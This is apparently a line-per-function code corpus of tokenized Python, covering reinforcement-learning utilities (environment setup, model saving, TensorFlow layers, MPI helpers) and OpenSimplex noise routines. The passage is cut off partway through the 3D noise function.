def save_act ( self , path = None ) : if path is None : path = os . path . join ( logger . get_dir ( ) , "model.pkl" ) with tempfile . TemporaryDirectory ( ) as td : save_variables ( os . path . join ( td , "model" ) ) arc_name = os . path . join ( td , "packed.zip" ) with zipfile . ZipFile ( arc_name , 'w' ) as zipf : for root , dirs , files in os . walk ( td ) : for fname in files : file_path = os . path . join ( root , fname ) if file_path != arc_name : zipf . write ( file_path , os . path . relpath ( file_path , td ) ) with open ( arc_name , "rb" ) as f : model_data = f . read ( ) with open ( path , "wb" ) as f : cloudpickle . dump ( ( model_data , self . _act_params ) , f )
def nature_cnn ( unscaled_images , * * conv_kwargs ) : scaled_images = tf . cast ( unscaled_images , tf . float32 ) / 255. activ = tf . nn . relu h = activ ( conv ( scaled_images , 'c1' , nf = 32 , rf = 8 , stride = 4 , init_scale = np . sqrt ( 2 ) , * * conv_kwargs ) ) h2 = activ ( conv ( h , 'c2' , nf = 64 , rf = 4 , stride = 2 , init_scale = np . sqrt ( 2 ) , * * conv_kwargs ) ) h3 = activ ( conv ( h2 , 'c3' , nf = 64 , rf = 3 , stride = 1 , init_scale = np . sqrt ( 2 ) , * * conv_kwargs ) ) h3 = conv_to_fc ( h3 ) return activ ( fc ( h3 , 'fc1' , nh = 512 , init_scale = np . sqrt ( 2 ) ) )
def make_vec_env ( env_id , env_type , num_env , seed , wrapper_kwargs = None , start_index = 0 , reward_scale = 1.0 , flatten_dict_observations = True , gamestate = None ) : wrapper_kwargs = wrapper_kwargs or { } mpi_rank = MPI . COMM_WORLD . Get_rank ( ) if MPI else 0 seed = seed + 10000 * mpi_rank if seed is not None else None logger_dir = logger . get_dir ( ) def make_thunk ( rank ) : return lambda : make_env ( env_id = env_id , env_type = env_type , mpi_rank = mpi_rank , subrank = rank , seed = seed , reward_scale = reward_scale , gamestate = gamestate , flatten_dict_observations = flatten_dict_observations , wrapper_kwargs = wrapper_kwargs , logger_dir = logger_dir ) set_global_seeds ( seed ) if num_env > 1 : return SubprocVecEnv ( [ make_thunk ( i + start_index ) for i in range ( num_env ) ] ) else : return DummyVecEnv ( [ make_thunk ( start_index ) ] )
def make_mujoco_env ( env_id , seed , reward_scale = 1.0 ) : rank = MPI . COMM_WORLD . Get_rank ( ) myseed = seed + 1000 * rank if seed is not None else None set_global_seeds ( myseed ) env = gym . make ( env_id ) logger_path = None if logger . get_dir ( ) is None else os . path . join ( logger . get_dir ( ) , str ( rank ) ) env = Monitor ( env , logger_path , allow_early_resets = True ) env . seed ( seed ) if reward_scale != 1.0 : from baselines . common . retro_wrappers import RewardScaler env = RewardScaler ( env , reward_scale ) return env
def make_robotics_env ( env_id , seed , rank = 0 ) : set_global_seeds ( seed ) env = gym . make ( env_id ) env = FlattenDictWrapper ( env , [ 'observation' , 'desired_goal' ] ) env = Monitor ( env , logger . get_dir ( ) and os . path . join ( logger . get_dir ( ) , str ( rank ) ) , info_keywords = ( 'is_success' , ) ) env . seed ( seed ) return env
def common_arg_parser ( ) : parser = arg_parser ( ) parser . add_argument ( '--env' , help = 'environment ID' , type = str , default = 'Reacher-v2' ) parser . add_argument ( '--env_type' , help = 'type of environment, used when the environment type cannot be automatically determined' , type = str ) parser . add_argument ( '--seed' , help = 'RNG seed' , type = int , default = None ) parser . add_argument ( '--alg' , help = 'Algorithm' , type = str , default = 'ppo2' ) parser . add_argument ( '--num_timesteps' , type = float , default = 1e6 ) , parser . add_argument ( '--network' , help = 'network type (mlp, cnn, lstm, cnn_lstm, conv_only)' , default = None ) parser . add_argument ( '--gamestate' , help = 'game state to load (so far only used in retro games)' , default = None ) parser . add_argument ( '--num_env' , help = 'Number of environment copies being run in parallel. When not specified, set to number of cpus for Atari, and to 1 for Mujoco' , default = None , type = int ) parser . add_argument ( '--reward_scale' , help = 'Reward scale factor. Default: 1.0' , default = 1.0 , type = float ) parser . add_argument ( '--save_path' , help = 'Path to save trained model to' , default = None , type = str ) parser . add_argument ( '--save_video_interval' , help = 'Save video every x steps (0 = disabled)' , default = 0 , type = int ) parser . add_argument ( '--save_video_length' , help = 'Length of recorded video. Default: 200' , default = 200 , type = int ) parser . add_argument ( '--play' , default = False , action = 'store_true' ) return parser
def robotics_arg_parser ( ) : parser = arg_parser ( ) parser . add_argument ( '--env' , help = 'environment ID' , type = str , default = 'FetchReach-v0' ) parser . add_argument ( '--seed' , help = 'RNG seed' , type = int , default = None ) parser . add_argument ( '--num-timesteps' , type = int , default = int ( 1e6 ) ) return parser
def parse_unknown_args ( args ) : retval = { } preceded_by_key = False for arg in args : if arg . startswith ( '--' ) : if '=' in arg : key = arg . split ( '=' ) [ 0 ] [ 2 : ] value = arg . split ( '=' ) [ 1 ] retval [ key ] = value else : key = arg [ 2 : ] preceded_by_key = True elif preceded_by_key : retval [ key ] = arg preceded_by_key = False return retval
def save_policy ( self , path ) : with open ( path , 'wb' ) as f : pickle . dump ( self . policy , f )
def logs ( self , prefix = 'worker' ) : logs = [ ] logs += [ ( 'success_rate' , np . mean ( self . success_history ) ) ] if self . compute_Q : logs += [ ( 'mean_Q' , np . mean ( self . Q_history ) ) ] logs += [ ( 'episode' , self . n_episodes ) ] if prefix != '' and not prefix . endswith ( '/' ) : return [ ( prefix + '/' + key , val ) for key , val in logs ] else : return logs
def copy_obs_dict ( obs ) : return { k : np . copy ( v ) for k , v in obs . items ( ) }
def value ( self , t ) : for ( l_t , l ) , ( r_t , r ) in zip ( self . _endpoints [ : - 1 ] , self . _endpoints [ 1 : ] ) : if l_t <= t and t < r_t : alpha = float ( t - l_t ) / ( r_t - l_t ) return self . _interpolation ( l , r , alpha ) # t does not belong to any of the pieces, so doom. assert self . _outside_value is not None return self . _outside_value
def sf01 ( arr ) : s = arr . shape return arr . swapaxes ( 0 , 1 ) . reshape ( s [ 0 ] * s [ 1 ] , * s [ 2 : ] )
def store_args ( method ) : argspec = inspect . getfullargspec ( method ) defaults = { } if argspec . defaults is not None : defaults = dict ( zip ( argspec . args [ - len ( argspec . defaults ) : ] , argspec . defaults ) ) if argspec . kwonlydefaults is not None : defaults . update ( argspec . kwonlydefaults ) arg_names = argspec . args [ 1 : ] @ functools . wraps ( method ) def wrapper ( * positional_args , * * keyword_args ) : self = positional_args [ 0 ] # Get default arg values args = defaults . copy ( ) # Add provided arg values for name , value in zip ( arg_names , positional_args [ 1 : ] ) : args [ name ] = value args . update ( keyword_args ) self . __dict__ . update ( args ) return method ( * positional_args , * * keyword_args ) return wrapper
def flatten_grads ( var_list , grads ) : return tf . concat ( [ tf . reshape ( grad , [ U . numel ( v ) ] ) for ( v , grad ) in zip ( var_list , grads ) ] , 0 )
def nn ( input , layers_sizes , reuse = None , flatten = False , name = "" ) : for i , size in enumerate ( layers_sizes ) : activation = tf . nn . relu if i < len ( layers_sizes ) - 1 else None input = tf . layers . dense ( inputs = input , units = size , kernel_initializer = tf . contrib . layers . xavier_initializer ( ) , reuse = reuse , name = name + '_' + str ( i ) ) if activation : input = activation ( input ) if flatten : assert layers_sizes [ - 1 ] == 1 input = tf . reshape ( input , [ - 1 ] ) return input
def get_session ( config = None ) : sess = tf . get_default_session ( ) if sess is None : sess = make_session ( config = config , make_default = True ) return sess
def initialize ( ) : new_variables = set ( tf . global_variables ( ) ) - ALREADY_INITIALIZED get_session ( ) . run ( tf . variables_initializer ( new_variables ) ) ALREADY_INITIALIZED . update ( new_variables )
def wrap_deepmind ( env , episode_life = True , clip_rewards = True , frame_stack = False , scale = False ) : if episode_life : env = EpisodicLifeEnv ( env ) if 'FIRE' in env . unwrapped . get_action_meanings ( ) : env = FireResetEnv ( env ) env = WarpFrame ( env ) if scale : env = ScaledFloatFrame ( env ) if clip_rewards : env = ClipRewardEnv ( env ) if frame_stack : env = FrameStack ( env , 4 ) return env
def gpu_count ( ) : if shutil . which ( 'nvidia-smi' ) is None : return 0 output = subprocess . check_output ( [ 'nvidia-smi' , '--query-gpu=gpu_name' , '--format=csv' ] ) return max ( 0 , len ( output . split ( b'\n' ) ) - 2 )
def setup_mpi_gpus ( ) : if 'CUDA_VISIBLE_DEVICES' not in os . environ : if sys . platform == 'darwin' : # This Assumes if you're on OSX you're just ids = [ ] # doing a smoke test and don't want GPUs else : lrank , _lsize = get_local_rank_size ( MPI . COMM_WORLD ) ids = [ lrank ] os . environ [ "CUDA_VISIBLE_DEVICES" ] = "," . join ( map ( str , ids ) )
def dict_gather ( comm , d , op = 'mean' , assert_all_have_data = True ) : if comm is None : return d alldicts = comm . allgather ( d ) size = comm . size k2li = defaultdict ( list ) for d in alldicts : for ( k , v ) in d . items ( ) : k2li [ k ] . append ( v ) result = { } for ( k , li ) in k2li . items ( ) : if assert_all_have_data : assert len ( li ) == size , "only %i out of %i MPI workers have sent '%s'" % ( len ( li ) , size , k ) if op == 'mean' : result [ k ] = np . mean ( li , axis = 0 ) elif op == 'sum' : result [ k ] = np . sum ( li , axis = 0 ) else : assert 0 , op return result
def add ( self , * args , * * kwargs ) : idx = self . _next_idx super ( ) . add ( * args , * * kwargs ) self . _it_sum [ idx ] = self . _max_priority ** self . _alpha self . _it_min [ idx ] = self . _max_priority ** self . _alpha
def wrap_deepmind_retro ( env , scale = True , frame_stack = 4 ) : env = WarpFrame ( env ) env = ClipRewardEnv ( env ) if frame_stack > 1 : env = FrameStack ( env , frame_stack ) if scale : env = ScaledFloatFrame ( env ) return env
def model ( inpt , num_actions , scope , reuse = False ) : with tf . variable_scope ( scope , reuse = reuse ) : out = inpt out = layers . fully_connected ( out , num_outputs = 64 , activation_fn = tf . nn . tanh ) out = layers . fully_connected ( out , num_outputs = num_actions , activation_fn = None ) return out
def parse_cmdline_kwargs ( args ) : def parse ( v ) : assert isinstance ( v , str ) try : return eval ( v ) except ( NameError , SyntaxError ) : return v return { k : parse ( v ) for k , v in parse_unknown_args ( args ) . items ( ) }
def terminate ( self ) : if self . _pool is not None : self . _pool . terminate ( ) self . _pool . join ( ) self . _pool = None
def terminate ( self ) : if not self . join_signal . is_set ( ) : self . join_signal . set ( ) # give minimal time to put generated batches in queue and gracefully shut down time . sleep ( 0.01 ) if self . main_worker_thread . is_alive ( ) : self . main_worker_thread . join ( ) if self . threaded : for worker in self . workers : if worker . is_alive ( ) : worker . join ( ) else : for worker in self . workers : if worker . is_alive ( ) : worker . terminate ( ) worker . join ( ) # wait until all workers are fully terminated while not self . all_finished ( ) : time . sleep ( 0.001 ) # empty queue until at least one element can be added and place None as signal that BL finished if self . queue . full ( ) : self . queue . get ( ) self . queue . put ( pickle . dumps ( None , protocol = - 1 ) ) time . sleep ( 0.01 ) # clean the queue, this reportedly prevents hanging threads while True : try : self . _queue_internal . get ( timeout = 0.005 ) except QueueEmpty : break if not self . _queue_internal . _closed : self . _queue_internal . close ( ) if not self . queue . _closed : self . queue . close ( ) self . _queue_internal . join_thread ( ) self . queue . join_thread ( ) time . sleep ( 0.025 )
def get_intersections ( self ) : if Real is float : return list ( self . intersections . keys ( ) ) else : return [ ( float ( p [ 0 ] ) , float ( p [ 1 ] ) ) for p in self . intersections . keys ( ) ]
def min_item ( self ) : if self . is_empty ( ) : raise ValueError ( "Tree is empty" ) node = self . _root while node . left is not None : node = node . left return node . key , node . value
def max_item ( self ) : if self . is_empty ( ) : raise ValueError ( "Tree is empty" ) node = self . _root while node . right is not None : node = node . right return node . key , node . value
def noise2d ( self , x , y ) : # Place input coordinates onto grid. stretch_offset = ( x + y ) * STRETCH_CONSTANT_2D xs = x + stretch_offset ys = y + stretch_offset # Floor to get grid coordinates of rhombus (stretched square) super-cell origin. xsb = floor ( xs ) ysb = floor ( ys ) # Skew out to get actual coordinates of rhombus origin. We'll need these later. squish_offset = ( xsb + ysb ) * SQUISH_CONSTANT_2D xb = xsb + squish_offset yb = ysb + squish_offset # Compute grid coordinates relative to rhombus origin. xins = xs - xsb yins = ys - ysb # Sum those together to get a value that determines which region we're in. in_sum = xins + yins # Positions relative to origin point. dx0 = x - xb dy0 = y - yb value = 0 # Contribution (1,0) dx1 = dx0 - 1 - SQUISH_CONSTANT_2D dy1 = dy0 - 0 - SQUISH_CONSTANT_2D attn1 = 2 - dx1 * dx1 - dy1 * dy1 extrapolate = self . _extrapolate2d if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , dx1 , dy1 ) # Contribution (0,1) dx2 = dx0 - 0 - SQUISH_CONSTANT_2D dy2 = dy0 - 1 - SQUISH_CONSTANT_2D attn2 = 2 - dx2 * dx2 - dy2 * dy2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , dx2 , dy2 ) if in_sum <= 1 : # We're inside the triangle (2-Simplex) at (0,0) zins = 1 - in_sum if zins > xins or zins > yins : # (0,0) is one of the closest two triangular vertices if xins > yins : xsv_ext = xsb + 1 ysv_ext = ysb - 1 dx_ext = dx0 - 1 dy_ext = dy0 + 1 else : xsv_ext = xsb - 1 ysv_ext = ysb + 1 dx_ext = dx0 + 1 dy_ext = dy0 - 1 else : # (1,0) and (0,1) are the closest two vertices. xsv_ext = xsb + 1 ysv_ext = ysb + 1 dx_ext = dx0 - 1 - 2 * SQUISH_CONSTANT_2D dy_ext = dy0 - 1 - 2 * SQUISH_CONSTANT_2D else : # We're inside the triangle (2-Simplex) at (1,1) zins = 2 - in_sum if zins < xins or zins < yins : # (0,0) is one of the closest two triangular vertices if xins > yins : xsv_ext = xsb + 2 ysv_ext = ysb + 0 dx_ext = dx0 - 2 - 2 * SQUISH_CONSTANT_2D dy_ext = dy0 + 0 - 2 * SQUISH_CONSTANT_2D else : xsv_ext = xsb + 0 ysv_ext = ysb + 2 dx_ext = dx0 + 0 - 2 * SQUISH_CONSTANT_2D dy_ext = dy0 - 2 - 2 * SQUISH_CONSTANT_2D else : # (1,0) and (0,1) are the closest two vertices. dx_ext = dx0 dy_ext = dy0 xsv_ext = xsb ysv_ext = ysb xsb += 1 ysb += 1 dx0 = dx0 - 1 - 2 * SQUISH_CONSTANT_2D dy0 = dy0 - 1 - 2 * SQUISH_CONSTANT_2D # Contribution (0,0) or (1,1) attn0 = 2 - dx0 * dx0 - dy0 * dy0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb , ysb , dx0 , dy0 ) # Extra Vertex attn_ext = 2 - dx_ext * dx_ext - dy_ext * dy_ext if attn_ext > 0 : attn_ext *= attn_ext value += attn_ext * attn_ext * extrapolate ( xsv_ext , ysv_ext , dx_ext , dy_ext ) return value / NORM_CONSTANT_2D
def noise3d ( self , x , y , z ) : # Place input coordinates on simplectic honeycomb. stretch_offset = ( x + y + z ) * STRETCH_CONSTANT_3D xs = x + stretch_offset ys = y + stretch_offset zs = z + stretch_offset # Floor to get simplectic honeycomb coordinates of rhombohedron (stretched cube) super-cell origin. xsb = floor ( xs ) ysb = floor ( ys ) zsb = floor ( zs ) # Skew out to get actual coordinates of rhombohedron origin. We'll need these later. squish_offset = ( xsb + ysb + zsb ) * SQUISH_CONSTANT_3D xb = xsb + squish_offset yb = ysb + squish_offset zb = zsb + squish_offset # Compute simplectic honeycomb coordinates relative to rhombohedral origin. xins = xs - xsb yins = ys - ysb zins = zs - zsb # Sum those together to get a value that determines which region we're in. in_sum = xins + yins + zins # Positions relative to origin point. dx0 = x - xb dy0 = y - yb dz0 = z - zb value = 0 extrapolate = self . _extrapolate3d if in_sum <= 1 : # We're inside the tetrahedron (3-Simplex) at (0,0,0) # Determine which two of (0,0,1), (0,1,0), (1,0,0) are closest. a_point = 0x01 a_score = xins b_point = 0x02 b_score = yins if a_score >= b_score and zins > b_score : b_score = zins b_point = 0x04 elif a_score < b_score and zins > a_score : a_score = zins a_point = 0x04 # Now we determine the two lattice points not part of the tetrahedron that may contribute. # This depends on the closest two tetrahedral vertices, including (0,0,0) wins = 1 - in_sum if wins > a_score or wins > b_score : # (0,0,0) is one of the closest two tetrahedral vertices. c = b_point if ( b_score > a_score ) else a_point # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) == 0 : xsv_ext0 = xsb - 1 xsv_ext1 = xsb dx_ext0 = dx0 + 1 dx_ext1 = dx0 else : xsv_ext0 = xsv_ext1 = xsb + 1 dx_ext0 = dx_ext1 = dx0 - 1 if ( c & 0x02 ) == 0 : ysv_ext0 = ysv_ext1 = ysb dy_ext0 = dy_ext1 = dy0 if ( c & 0x01 ) == 0 : ysv_ext1 -= 1 dy_ext1 += 1 else : ysv_ext0 -= 1 dy_ext0 += 1 else : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy_ext1 = dy0 - 1 if ( c & 0x04 ) == 0 : zsv_ext0 = zsb zsv_ext1 = zsb - 1 dz_ext0 = dz0 dz_ext1 = dz0 + 1 else : zsv_ext0 = zsv_ext1 = zsb + 1 dz_ext0 = dz_ext1 = dz0 - 1 else : # (0,0,0) is not one of the closest two tetrahedral vertices. c = ( a_point | b_point ) # Our two extra vertices are determined by the closest two. if ( c & 0x01 ) == 0 : xsv_ext0 = xsb xsv_ext1 = xsb - 1 dx_ext0 = dx0 - 2 * SQUISH_CONSTANT_3D dx_ext1 = dx0 + 1 - SQUISH_CONSTANT_3D else : xsv_ext0 = xsv_ext1 = xsb + 1 dx_ext0 = dx0 - 1 - 2 * SQUISH_CONSTANT_3D dx_ext1 = dx0 - 1 - SQUISH_CONSTANT_3D if ( c & 0x02 ) == 0 : ysv_ext0 = ysb ysv_ext1 = ysb - 1 dy_ext0 = dy0 - 2 * SQUISH_CONSTANT_3D dy_ext1 = dy0 + 1 - SQUISH_CONSTANT_3D else : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy0 - 1 - 2 * SQUISH_CONSTANT_3D dy_ext1 = dy0 - 1 - SQUISH_CONSTANT_3D if ( c & 0x04 ) == 0 : zsv_ext0 = zsb zsv_ext1 = zsb - 1 dz_ext0 = dz0 - 2 * SQUISH_CONSTANT_3D dz_ext1 = dz0 + 1 - SQUISH_CONSTANT_3D else : zsv_ext0 = zsv_ext1 = zsb + 1 dz_ext0 = dz0 - 1 - 2 * SQUISH_CONSTANT_3D dz_ext1 = dz0 - 1 - SQUISH_CONSTANT_3D # Contribution (0,0,0) attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , dx0 , dy0 , dz0 ) # Contribution (1,0,0) dx1 = dx0 - 1 - SQUISH_CONSTANT_3D dy1 = dy0 - 0 - SQUISH_CONSTANT_3D dz1 = dz0 - 0 - SQUISH_CONSTANT_3D attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , dx1 , dy1 , dz1 ) # Contribution (0,1,0) dx2 = dx0 - 0 - SQUISH_CONSTANT_3D dy2 = dy0 - 1 - SQUISH_CONSTANT_3D dz2 = dz1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , dx2 , dy2 , dz2 ) # Contribution (0,0,1) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH_CONSTANT_3D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , dx3 , dy3 , dz3 ) elif in_sum >= 2 : # We're inside the tetrahedron (3-Simplex) at (1,1,1) # Determine which two tetrahedral vertices are the closest, out of (1,1,0), (1,0,1), (0,1,1) but not (1,1,1). a_point = 0x06 a_score = xins b_point = 0x05 b_score = yins if a_score <= b_score and zins < b_score : b_score = zins b_point = 0x03 elif a_score > b_score and zins < a_score : a_score = zins a_point = 0x03 # Now we determine the two lattice points not part of the tetrahedron that may contribute. # This depends on the closest two tetrahedral vertices, including (1,1,1) wins = 3 - in_sum if wins < a_score or wins < b_score : # (1,1,1) is one of the closest two tetrahedral vertices. c = b_point if ( b_score < a_score ) else a_point # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) != 0 : xsv_ext0 = xsb + 2 xsv_ext1 = xsb + 1 dx_ext0 = dx0 - 2 - 3 * SQUISH_CONSTANT_3D dx_ext1 = dx0 - 1 - 3 * SQUISH_CONSTANT_3D else : xsv_ext0 = xsv_ext1 = xsb dx_ext0 = dx_ext1 = dx0 - 3 * SQUISH_CONSTANT_3D if ( c & 0x02 ) != 0 : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy_ext1 = dy0 - 1 - 3 * SQUISH_CONSTANT_3D if ( c & 0x01 ) != 0 : ysv_ext1 += 1 dy_ext1 -= 1 else : ysv_ext0 += 1 dy_ext0 -= 1 else : ysv_ext0 = ysv_ext1 = ysb dy_ext0 = dy_ext1 = dy0 - 3 * SQUISH_CONSTANT_3D if ( c & 0x04 ) != 0 : zsv_ext0 = zsb + 1 zsv_ext1 = zsb + 2 dz_ext0 = dz0 - 1 - 3 * SQUISH_CONSTANT_3D dz_ext1 = dz0 - 2 - 3 * SQUISH_CONSTANT_3D else : zsv_ext0 = zsv_ext1 = zsb dz_ext0 = dz_ext1 = dz0 - 3 * SQUISH_CONSTANT_3D else : # (1,1,1) is not one of the closest two tetrahedral vertices. c = ( a_point & b_point ) # Our two extra vertices are determined by the closest two. if ( c & 0x01 ) != 0 : xsv_ext0 = xsb + 1 xsv_ext1 = xsb + 2 dx_ext0 = dx0 - 1 - SQUISH_CONSTANT_3D dx_ext1 = dx0 - 2 - 2 * SQUISH_CONSTANT_3D else : xsv_ext0 = xsv_ext1 = xsb dx_ext0 = dx0 - SQUISH_CONSTANT_3D dx_ext1 = dx0 - 2 * SQUISH_CONSTANT_3D if ( c & 0x02 ) != 0 : ysv_ext0 = ysb + 1 ysv_ext1 = ysb + 2 dy_ext0 = dy0 - 1 - SQUISH_CONSTANT_3D dy_ext1 = dy0 - 2 - 2 * SQUISH_CONSTANT_3D else : ysv_ext0 = ysv_ext1 = ysb dy_ext0 = dy0 - SQUISH_CONSTANT_3D dy_ext1 = dy0 - 2 * SQUISH_CONSTANT_3D if ( c & 0x04 ) != 0 : zsv_ext0 = zsb + 1 zsv_ext1 = zsb + 2 dz_ext0 = dz0 - 1 - SQUISH_CONSTANT_3D dz_ext1 = dz0 - 2 - 2 * SQUISH_CONSTANT_3D else : zsv_ext0 = zsv_ext1 = zsb dz_ext0 = dz0 - SQUISH_CONSTANT_3D dz_ext1 = dz0 - 2 * SQUISH_CONSTANT_3D # Contribution (1,1,0) dx3 = dx0 - 1 - 2 * SQUISH_CONSTANT_3D dy3 = dy0 - 1 - 2 * SQUISH_CONSTANT_3D dz3 = dz0 - 0 - 2 * SQUISH_CONSTANT_3D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , dx3 , dy3 , dz3 ) # Contribution (1,0,1) dx2 = dx3 dy2 = dy0 - 0 - 2 * SQUISH_CONSTANT_3D dz2 = dz0 - 1 - 2 * SQUISH_CONSTANT_3D attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , dx2 , dy2 , dz2 ) # Contribution (0,1,1) dx1 = dx0 - 0 - 2 * SQUISH_CONSTANT_3D dy1 = dy3 dz1 = dz2 attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , dx1 , dy1 , dz1 ) # Contribution (1,1,1) dx0 = dx0 - 1 - 3 * SQUISH_CONSTANT_3D dy0 = dy0 - 1 - 3 * SQUISH_CONSTANT_3D dz0 = dz0 - 1 - 3 * SQUISH_CONSTANT_3D attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , dx0 , dy0 , dz0 ) else : # We're inside the octahedron (Rectified 3-Simplex) in between. # Decide between point (0,0,1) and (1,1,0) as closest p1 = xins + yins if p1 > 1 : a_score = p1 - 1 a_point = 0x03 a_is_further_side = True else : a_score = 1 - p1 a_point = 0x04 a_is_further_side = False # Decide between point (0,1,0) and (1,0,1) as closest p2 = xins + zins if p2 > 1 : b_score = p2 - 1 b_point = 0x05 b_is_further_side = True else : b_score = 1 - p2 b_point = 0x02 b_is_further_side = False # The closest out of the two (1,0,0) and (0,1,1) will replace the furthest out of the two decided above, if closer. p3 = yins + zins if p3 > 1 : score = p3 - 1 if a_score <= b_score and a_score < score : a_point = 0x06 a_is_further_side = True elif a_score > b_score and b_score < score : b_point = 0x06 b_is_further_side = True else : score = 1 - p3 if a_score <= b_score and a_score < score : a_point = 0x01 a_is_further_side = False elif a_score > b_score and b_score < score : b_point = 0x01 b_is_further_side = False # Where each of the two closest points are determines how the extra two vertices are calculated. if a_is_further_side == b_is_further_side : if a_is_further_side : # Both closest points on (1,1,1) side # One of the two extra points is (1,1,1) dx_ext0 = dx0 - 1 - 3 * SQUISH_CONSTANT_3D dy_ext0 = dy0 - 1 - 3 * SQUISH_CONSTANT_3D dz_ext0 = dz0 - 1 - 3 * SQUISH_CONSTANT_3D xsv_ext0 = xsb + 1 ysv_ext0 = ysb + 1 zsv_ext0 = zsb + 1 # Other extra point is based on the shared axis. c = ( a_point & b_point ) if ( c & 0x01 ) != 0 : dx_ext1 = dx0 - 2 - 2 * SQUISH_CONSTANT_3D dy_ext1 = dy0 - 2 * SQUISH_CONSTANT_3D dz_ext1 = dz0 - 2 * SQUISH_CONSTANT_3D xsv_ext1 = xsb + 2 ysv_ext1 = ysb zsv_ext1 = zsb elif ( c & 0x02 ) != 0 : dx_ext1 = dx0 - 2 * SQUISH_CONSTANT_3D dy_ext1 = dy0 - 2 - 2 * SQUISH_CONSTANT_3D dz_ext1 = dz0 - 2 * SQUISH_CONSTANT_3D xsv_ext1 = xsb ysv_ext1 = ysb + 2 zsv_ext1 = zsb else : dx_ext1 = dx0 - 2 * SQUISH_CONSTANT_3D dy_ext1 = dy0 - 2 * SQUISH_CONSTANT_3D dz_ext1 = dz0 - 2 - 2 * SQUISH_CONSTANT_3D xsv_ext1 = xsb ysv_ext1 = ysb zsv_ext1 = zsb + 2 else : # Both closest points on (0,0,0) side # One of the two extra points is (0,0,0) dx_ext0 = dx0 dy_ext0 = dy0 dz_ext0 = dz0 xsv_ext0 = xsb ysv_ext0 = ysb zsv_ext0 = zsb # Other extra point is based on the omitted axis. c = ( a_point | b_point ) if ( c & 0x01 ) == 0 : dx_ext1 = dx0 + 1 - SQUISH_CONSTANT_3D dy_ext1 = dy0 - 1 - SQUISH_CONSTANT_3D dz_ext1 = dz0 - 1 - SQUISH_CONSTANT_3D xsv_ext1 = xsb - 1 ysv_ext1 = ysb + 1 zsv_ext1 = zsb + 1 elif ( c & 0x02 ) == 0 : dx_ext1 = dx0 - 1 - SQUISH_CONSTANT_3D dy_ext1 = dy0 + 1 - SQUISH_CONSTANT_3D dz_ext1 = dz0 - 1 - SQUISH_CONSTANT_3D xsv_ext1 = xsb + 1 ysv_ext1 = ysb - 1 zsv_ext1 = zsb + 1 else : dx_ext1 = dx0 - 1 - SQUISH_CONSTANT_3D dy_ext1 = dy0 - 1 - SQUISH_CONSTANT_3D dz_ext1 = dz0 + 1 - SQUISH_CONSTANT_3D xsv_ext1 = xsb + 1 ysv_ext1 = ysb + 1 zsv_ext1 = zsb - 1 else : # One point on (0,0,0) side, one point on (1,1,1) side if a_is_further_side : c1 = a_point c2 = b_point else : c1 = b_point c2 = a_point # One contribution is a _permutation of (1,1,-1) if ( c1 & 0x01 ) == 0 : dx_ext0 = dx0 + 1 - SQUISH_CONSTANT_3D dy_ext0 = dy0 - 1 - SQUISH_CONSTANT_3D dz_ext0 = dz0 - 1 - SQUISH_CONSTANT_3D xsv_ext0 = xsb - 1 ysv_ext0 = ysb + 1 zsv_ext0 = zsb + 1 elif ( c1 & 0x02 ) == 0 : dx_ext0 = dx0 - 1 - SQUISH_CONSTANT_3D dy_ext0 = dy0 + 1 - SQUISH_CONSTANT_3D dz_ext0 = dz0 - 1 - SQUISH_CONSTANT_3D xsv_ext0 = xsb + 1 ysv_ext0 = ysb - 1 zsv_ext0 = zsb + 1 else : dx_ext0 = dx0 - 1 - SQUISH_CONSTANT_3D dy_ext0 = dy0 - 1 - SQUISH_CONSTANT_3D dz_ext0 = dz0 + 1 - SQUISH_CONSTANT_3D xsv_ext0 = xsb + 1 ysv_ext0 = ysb + 1 zsv_ext0 = zsb - 1 # One contribution is a _permutation of (0,0,2) dx_ext1 = dx0 - 2 * SQUISH_CONSTANT_3D dy_ext1 = dy0 - 2 * SQUISH_CONSTANT_3D dz_ext1 = dz0 - 2 * SQUISH_CONSTANT_3D xsv_ext1 = xsb ysv_ext1 = ysb zsv_ext1 = zsb if ( c2 & 0x01 ) != 0 : dx_ext1 -= 2 xsv_ext1 += 2 elif ( c2 & 0x02 ) != 0 : dy_ext1 -= 2 ysv_ext1 += 2 else : dz_ext1 -= 2 zsv_ext1 += 2 # Contribution (1,0,0) dx1 = dx0 - 1 - SQUISH_CONSTANT_3D dy1 = dy0 - 0 - SQUISH_CONSTANT_3D dz1 = dz0 - 0 - SQUISH_CONSTANT_3D attn1 = 2 - dx1 * dx1 - 